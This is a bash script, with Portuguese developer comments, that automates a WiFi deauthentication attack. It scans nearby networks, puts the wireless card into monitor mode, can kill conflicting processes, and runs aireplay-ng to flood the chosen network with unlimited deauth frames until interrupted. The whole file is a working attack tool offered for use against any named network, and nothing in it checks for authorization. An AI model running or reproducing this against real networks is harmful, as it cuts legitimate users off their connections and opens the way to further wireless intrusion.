#!/bin/bash

# contributors: mel, kd, cr0d, rck, vm, ...

# --- TO DO ---
# - Corrigir completamente o bug 1D
# - Corrigir completamente o bug 1G
# - Corrigir completamente o bug 1B
# - Corrigir completamente o bug 1C
# - Corrigir completamente o bug 1A
# - Corrigir completamente os bugs 1F e 1E e funcionalidade 2B - Criar outro script para detecção de redes. Tentar usar o do wifite
# - Criar um instalador para linux (2A)- Instala todas as dependências, move os arquivos para /bin/ (executa em qualquer lugar) & auto update (pelo software) & corrigir o FOR que monta o comando de instalação.

# - BUGS:
# 1A- Detecta interface de rede errada
# 1B- Detecta duas interfaces de rede na mesma string ao ter adaptador plugado
# 1C- Não avisa o usuário se a interface de rede não suporta o modo monitor
# 1D- Ataca a rede com o canal errado
# 1E- Algumas redes aparecem com o nome incompleto
# 1F- As vezes o scanner não detecta todas as redes
# 1G- Setar nome fixo para a interface em modo monitor

# - Novas funcionalidades:
# 2A- Criar instalador para o linux
# 2B- Permitir que o scan de redes dure mais ou menos tempo, e permitir o reescan de redes


#=== MAIS INFORMAÇÕES ===
# Capturar o nome das redes wireless do arquivo temporário e passar para um array
#Dar um echo neste array, mostrando o número da posição do array +1 e o nome da rede, no seguinte formato
#1;Rede 01
#2;Rede 02
#3;Rede Wireless
#-------
#Pegar o canal do array com o nº da linha (posição do array +1) com: head -n 2 redes.csv | tail -n 1
#-------
# Ajustar seleção de redes wireless, ao passar 0 -> reescanear redes.
#1;Rede 01
#2;Rede 02
#3;Rede Wireless
#Pressione 0 para reescanear as redes wireless
#-------
# ==== PERFUMARIAS DESNECESSÁRIAS :) ====
# Criar um parser para as redes wireless, para mostrá-las neste formato
#   +----+---------------+
#   | Id | Network       |
#   |  1 | Rede 01       |
#   |  2 | Rede 02       |
#   |  3 | Rede Wireless |
#   |  4 |               |
#   |  5 |               |
#   |  6 |               |
#   +----+---------------+


usage()
{
    echo -e "\nUsage: sudo bash ./deauth_attack.sh <args>"
    echo -e "\nOptional Arguments:"
    echo "-i \"<name>\"       : The wireless interface which will be used"
    echo "-k                : Kill the processes that can cause conflicts with the attack"
    echo "-n \"<name>\"       : The network name which the attack will be performed"
    #    echo "-s <y,n>          : Don't show the DeAuth messages when performing the attack [Default:n]"
    echo "-h                : Show this help message"
}

[ "$EUID" -eq 0 ] || { 
    usage
    echo "";
    echo "[NOTICE] most of the commands need \"root\"";
    echo "";
    exit;
}

APT_INSTALL="sudo apt-get -y install "
ERRO=0

for CMD in route airmon-ng mktemp iwlist iwconfig wash getopt pkill
do
    # TESTA SE TODAS AS DEPENDÊNCIAS ESTÃO INSTALADAS
    if [ ! `which $CMD` ]
    then
        #ALGUNS PACOTES SÃO SUBPACOTES DE PACOTES MAIORES
        case "$CMD" in
            "airmon-ng")
                APT_INSTALL+="aircrack-ng "
                ;;
            "route")
                APT_INSTALL+="net-tools "
                ;;
            "wash")
                APT_INSTALL+="reaver "
                ;;
            *)
                APT_INSTALL+=$CMD" "
                ;;
        esac
        ERRO=1
    fi
done

# CASO ERRO, MONTA A STRING DE INSTALAÇÃO E MOSTRA PARA O USUÁRIO
if [ $ERRO == 1 ]
then
    echo ""
    echo "[ERROR] Missing commands/apps. Install them first."
    echo ""
    echo "shell$ $APT_INSTALL"
    echo ""
    exit
fi

# find WiFi net interface
INTERFACE=`iwconfig 2> /dev/null | grep 'IEEE 802.11' | awk '{print $1}'`
# tmp file
TMP_FILE=$(mktemp)
# keep control if the user wants to kill conflicting processes 
KILL=0

# stop airmon-ng and start WiFi interface in normal mode
reset_net_config()
{
    echo -n "Re-setting WiFi network configuration ... "
    airmon-ng stop $INTERFACE"mon" 1> /dev/null
    service network-manager start 1> /dev/null
    sleep 5
    echo "done."
}

check_promiscuous_mode()
{
    echo -n "Checking whether promiscuous mode is ON ... "
    if [ -z "$INTERFACE" ]
    then
        NET_IFACE="$(airmon-ng | grep "mon" | cut -f 2)"
        INTERFACE="${NET_IFACE::-3}"
        reset_net_config
    fi
    echo "done."
    echo "Network interface: "$INTERFACE
}

# parse WiFi network names from iwlist's output
parse_iwl()
{
    while IFS= read -r line; do
        [[ "$line" =~ \(Channel ]] && {
        chn=${line##*nel };
        chn=${chn:0:$((${#chn}-1))};
    }
    [[ "$line" =~ ESSID ]] && {
    essid=${line##*ID:}
    echo "$essid;$chn"; } done
}

# find available networks
scan_networks()
{
    echo -n "Scanning WiFi networks ... "
    iwlist $INTERFACE scan | parse_iwl > $TMP_FILE
    echo "done."
}

#Função executa se o usuário passar o nome da rede como parâmetro
choose_network()
{
    echo -e "\n-- networks found: --"
    # list network names
    cat $TMP_FILE | cut -d";" -f1 | sed -e 's/^"//' -e 's/"$//'
    echo -n  -e "\nType in the network name you want to attack: "
    read NETWORK
}

#Testa se o nome da rede é válido, evitando futuros erros
verify_network()
{
    echo -n "Verifying network ... "
    NETWORK_IS_UP=0
    IFS=";"
    while read f1 f2
    do
        temp="${f1//\"}"
        if [ "$temp" == "$NETWORK" ]
        then
            NETWORK_IS_UP=1 
            break
        fi
    done < $TMP_FILE
    echo "done."
}

#Testa se a interface de rede é válida
verify_interface()
{
    echo -n "Verifying interface ... "
    if sudo ifconfig | grep $INTERFACE > /dev/null ; then
        echo "done."
    else
        echo ""
        echo "[ERROR] Interface not found."
        exit
    fi
}

echo "

▓█████▄ ▓█████ ▄▄▄       █    ██ ▄▄▄█████▓ ██░ ██
▒██▀ ██▌▓█   ▀▒████▄     ██  ▓██▒▓  ██▒ ▓▒▓██░ ██▒
░██   █▌▒███  ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██▀▀██░
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ░▓█ ░██
░▒████▓ ░▒████▒▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░▓█▒░██▓
▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░    ▒ ░░▒░▒
░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░░░▒░ ░ ░     ░     ▒ ░▒░ ░
░ ░  ░    ░    ░   ▒    ░░░ ░ ░   ░       ░  ░░ ░
░       ░  ░     ░  ░   ░               ░  ░  ░
░

▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄
▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░
░  ░                       ░  ░░ ░      ░  ░
░

"


sleep 3

echo "[DeAuthAttack] BEGIN"

while getopts "i:kn:h" opt; do
    case "$opt" in
        i)
            INTERFACE=$OPTARG ;;
        k)
            KILL=1 ;;
        n)
            NETWORK=$OPTARG ;;
        h)
            usage 
            exit ;;
    esac
done

verify_interface

check_promiscuous_mode
scan_networks

#Se a network não foi setada, não foi passada como parâmetro logo,
#Devemos pedir para o usuário inserir a rede
if [ -z ${NETWORK+x} ];
then
    choose_network
fi

#Verifica se a rede inserida está no arquivo temporário
verify_network
if [ $NETWORK_IS_UP -eq 0 ]
then
    echo ""
    echo "[ERROR] Network not found."
    echo ""
    exit
fi

# get the correct channel of the selected network
CHANNEL="$(cat $TMP_FILE | grep -i "$NETWORK" | cut -d";" -f2)"
echo "Network channel: $CHANNEL"

echo -n "Starting attack tools ... "
airmon-ng start $INTERFACE 1> /dev/null

#Mata os processos conflitantes, se o usuário passou k como parâmetro.
if [ $KILL == 1 ]
then
    airmon-ng check kill 1> /dev/null
fi
echo "done."

echo -n "Changing the WiFi network channel ... "
wash -i $INTERFACE"mon" -c $CHANNEL -C -o /dev/null -D 2> /dev/null
# wait a bit before killing the process
sleep 2
pkill wash
echo "done."

echo -n "Starting the attack ... "
aireplay-ng -0 0 -e "$NETWORK" $INTERFACE"mon" &

# trap <ctrl+c> signal
trap " " SIGINT
# wait until the user types <ctrl+c> to end the attacking script
wait
# kill the attack process
kill $!
# redirect kill's output to /dev/null
wait $! 2>/dev/null

echo -e "\n[DeAuthAttack] FINISHED"
reset_net_config
